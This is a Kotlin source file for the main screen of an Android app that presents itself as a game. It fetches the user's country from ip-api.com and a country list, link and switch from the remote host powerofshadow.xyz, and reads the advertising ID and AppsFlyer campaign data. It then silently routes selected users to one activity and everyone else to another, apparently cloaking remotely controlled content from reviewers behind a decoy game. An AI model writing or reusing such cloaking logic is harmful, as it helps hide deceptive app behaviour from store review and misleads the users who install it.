package com.ngelgames.herocant

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.ngelgames.herocant.InMainClass.Companion.C1
import com.ngelgames.herocant.InMainClass.Companion.MAIN_ID
import com.ngelgames.herocant.InMainClass.Companion.appsCheck
import com.ngelgames.herocant.InMainClass.Companion.appsKey
import com.ngelgames.herocant.InMainClass.Companion.link
import com.ngelgames.herocant.databinding.ActivityMainBinding
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.*
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    lateinit var bindMainAct: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)


        bindMainAct = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMainAct.root)
        GlobalScope.launch(Dispatchers.IO) {
                job
        }

        val set = getSharedPreferences("PREFS_NAME", 0)



        if (set.getBoolean("my_first_time", true)) {

           AppsFlyerLib.getInstance()
                .init("Aax8r92Rg4Fz8QpENmddFL", conversionDataListener, applicationContext)
                AppsFlyerLib.getInstance().start(this@MainActivity)

            set.edit().putBoolean("my_first_time", false).apply()
        }

    }

    private fun getAdId(){
            val adInfo = AdvertisingIdClient(applicationContext)
            adInfo.start()
            val adIdInfo = adInfo.info.id
            Log.d("getAdvertisingId = ", adIdInfo.toString())
            Hawk.put(MAIN_ID, adIdInfo)
    }


    //Data API
    private suspend fun getData(): String? {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://ip-api.com/")
            .build()
            .create(ApiInterface::class.java)


        val retData = retrofitBuilder.getData().body()?.countryCode
        Log.d("Data", "countryCode: $retData ")
        return retData

    }


    //Data Hosting
    private suspend fun getDataDev(): String? {
        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://powerofshadow.xyz/")
            .build()
            .create(ApiInterface::class.java)

        val linkView = retroBuildTwo.getDataDev().body()?.view
        Log.d("Data", "getDataDev: $linkView")
        val appsChecker = retroBuildTwo.getDataDev().body()?.appsChecker
        val appskey = retroBuildTwo.getDataDev().body()?.appskey
        Hawk.put(appsKey, appskey)
        Hawk.put(appsCheck, appsChecker)
        Hawk.put(link, linkView)
        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(link, "null")}")
        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(appsCheck, "null")}")
        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(appsKey, "null")}")
        val retroData = retroBuildTwo.getDataDev().body()?.geo
        Log.d("Data", retroData.toString())
        return retroData
    }

    //
    private val job: Job = GlobalScope.launch(Dispatchers.IO) {
        val countyCode: String = getData().toString()
        val countriesPool = getDataDev().toString()
        val appsCh = Hawk.get(appsCheck, "null")
        val naming: String? = Hawk.get(C1)

        getAdId()
        if (appsCh == "1") {
            val executorService = Executors.newSingleThreadScheduledExecutor()
            executorService.scheduleAtFixedRate({
                if (naming != null) {
                    Log.d("TestInUIHawk", naming)
                    if (naming.contains("tdb2") || countriesPool.contains(countyCode)) {
                        Log.d("Apps Checker", "naming: $naming")
                        executorService.shutdown()
                        startActivity(Intent(this@MainActivity, ITIS::class.java))
                        finish()
                    } else {
                        executorService.shutdown()
                        startActivity(Intent(this@MainActivity, URam::class.java))
                        finish()
                    }
                } else {
                    Log.d("TestInUIHawk", "Received null")
                }

            }, 0, 2, TimeUnit.SECONDS)
        }

//            else {
//                if (naming.contains("tdb2") || countriesPool.contains(countyCode)) {
//                        Log.d("Apps Checker of second open", "naming: $naming")
//                        startActivity(Intent(this@MainActivity, ITIS::class.java))
//                        finish()
//                    } else {
//                        startActivity(Intent(this@MainActivity, URam::class.java))
//                        finish()
//                    }
//                }

         else if (countriesPool.contains(countyCode)) {
            startActivity(Intent(this@MainActivity, ITIS::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, URam::class.java))
            finish()
        }
    }
}

    val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            Log.d("dev_test", "onConversionDataHUISOSI: ${data.toString()}")
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(C1, dataGotten)
        }

        override fun onConversionDataFail(p0: String?) {
            Log.e("dev_test", "error getting conversion data: $p0" );
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }





